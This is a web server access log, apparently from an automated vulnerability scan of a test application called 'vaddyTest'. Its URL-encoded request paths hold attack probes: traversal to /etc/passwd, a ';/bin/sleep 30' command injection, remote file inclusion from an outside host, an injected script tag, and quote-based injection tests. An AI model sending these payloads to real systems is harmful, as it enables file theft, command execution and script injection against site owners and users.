52.69.45.235 - - [20/Dec/2019:08:03:04 +0000] "POST /..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd/addPost HTTP/1.1" 400 -
52.69.45.235 - - [20/Dec/2019:08:03:05 +0000] "POST /vaddyTest/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 400 -
52.69.45.235 - - [20/Dec/2019:08:03:05 +0000] "POST /vaddyTest/addPost%3B%2Fbin%2Fsleep+30 HTTP/1.1" 400 -
52.69.45.235 - - [20/Dec/2019:08:03:05 +0000] "POST /vaddyTest/addPost%3B%2Fbin%2Fsleep+30 HTTP/1.1" 400 -
52.69.45.235 - - [20/Dec/2019:08:03:06 +0000] "POST /http%3A%2F%2Frficheck.vaddy.net%2Frfi30.txt%3F%3F%3F/addPost HTTP/1.1" 400 -
52.69.45.235 - - [20/Dec/2019:08:03:06 +0000] "POST /vaddyTest/http%3A%2F%2Frficheck.vaddy.net%2Frfi30.txt%3F%3F%3F HTTP/1.1" 400 -
52.69.45.235 - - [20/Dec/2019:08:03:06 +0000] "POST /vaddyTest/addPost HTTP/1.1" 302 -
52.69.45.235 - - [20/Dec/2019:08:03:07 +0000] "GET /vaddyTest/home HTTP/1.1" 200 78068
52.69.45.235 - - [20/Dec/2019:08:03:07 +0000] "GET /vaddyTest/home HTTP/1.1" 200 78068
52.69.45.235 - - [20/Dec/2019:08:03:08 +0000] "GET /vaddyTest%3Cscript+src%3Dhttp%3A%2F%2Fvaddy.net%2FXSSTOKEN%2Fvaddy.js%3E%3C%2Fscript%3E/injection HTTP/1.1" 400 -
52.69.45.235 - - [20/Dec/2019:08:03:08 +0000] "GET /vaddyTest/injection%3Cscript+src%3Dhttp%3A%2F%2Fvaddy.net%2FXSSTOKEN%2Fvaddy.js%3E%3C%2Fscript%3E HTTP/1.1" 400 -
52.69.45.235 - - [20/Dec/2019:08:03:09 +0000] "GET /vaddyTest%27/injection HTTP/1.1" 404 1020
52.69.45.235 - - [20/Dec/2019:08:03:09 +0000] "GET /vaddyTest/injection%27 HTTP/1.1" 404 974
52.69.45.235 - - [20/Dec/2019:08:03:09 +0000] "GET /vaddyTest%2F*%2F/injection HTTP/1.1" 400 -
52.69.45.235 - - [20/Dec/2019:08:03:10 +0000] "GET /vaddyTest/injection%2F*%2F HTTP/1.1" 400 -
52.69.45.235 - - [20/Dec/2019:08:03:10 +0000] "GET /..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd/injection HTTP/1.1" 400 -
52.69.45.235 - - [20/Dec/2019:08:03:10 +0000] "GET /vaddyTest/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 400 -
52.69.45.235 - - [20/Dec/2019:08:03:10 +0000] "GET /vaddyTest/injection%3B%2Fbin%2Fsleep+30 HTTP/1.1" 400 -
52.69.45.235 - - [20/Dec/2019:08:03:11 +0000] "GET /vaddyTest/injection%3B%2Fbin%2Fsleep+30 HTTP/1.1" 400 -
52.69.45.235 - - [20/Dec/2019:08:03:11 +0000] "GET /http%3A%2F%2Frficheck.vaddy.net%2Frfi30.txt%3F%3F%3F/injection HTTP/1.1" 400 -
52.69.45.235 - - [20/Dec/2019:08:03:11 +0000] "GET /vaddyTest/http%3A%2F%2Frficheck.vaddy.net%2Frfi30.txt%3F%3F%3F HTTP/1.1" 400 -
52.69.45.235 - - [20/Dec/2019:08:03:12 +0000] "GET /vaddyTest/injection HTTP/1.1" 200 985
52.69.45.235 - - [20/Dec/2019:08:03:12 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1139
52.69.45.235 - - [20/Dec/2019:08:03:12 +0000] "POST /vaddyTest/login HTTP/1.1" 302 -
52.69.45.235 - - [20/Dec/2019:08:03:13 +0000] "GET /vaddyTest/home HTTP/1.1" 200 78068
52.69.45.235 - - [20/Dec/2019:08:03:13 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1139
52.69.45.235 - - [20/Dec/2019:08:03:14 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1037
52.69.45.235 - - [20/Dec/2019:08:03:14 +0000] "POST /vaddyTest/login HTTP/1.1" 302 -
52.69.45.235 - - [20/Dec/2019:08:03:14 +0000] "GET /vaddyTest/home HTTP/1.1" 200 78068
52.69.45.235 - - [20/Dec/2019:08:03:15 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1037
52.69.45.235 - - [20/Dec/2019:08:03:15 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1034
52.69.45.235 - - [20/Dec/2019:08:03:16 +0000] "POST /vaddyTest/login HTTP/1.1" 302 -
52.69.45.235 - - [20/Dec/2019:08:03:16 +0000] "GET /vaddyTest/home HTTP/1.1" 200 78068
52.69.45.235 - - [20/Dec/2019:08:03:17 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1034
52.69.45.235 - - [20/Dec/2019:08:03:17 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1086
52.69.45.235 - - [20/Dec/2019:08:03:17 +0000] "POST /vaddyTest/login HTTP/1.1" 302 -
52.69.45.235 - - [20/Dec/2019:08:03:18 +0000] "GET /vaddyTest/home HTTP/1.1" 200 78068
52.69.45.235 - - [20/Dec/2019:08:03:18 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1086
52.69.45.235 - - [20/Dec/2019:08:03:18 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1045
52.69.45.235 - - [20/Dec/2019:08:03:19 +0000] "POST /vaddyTest/login HTTP/1.1" 302 -
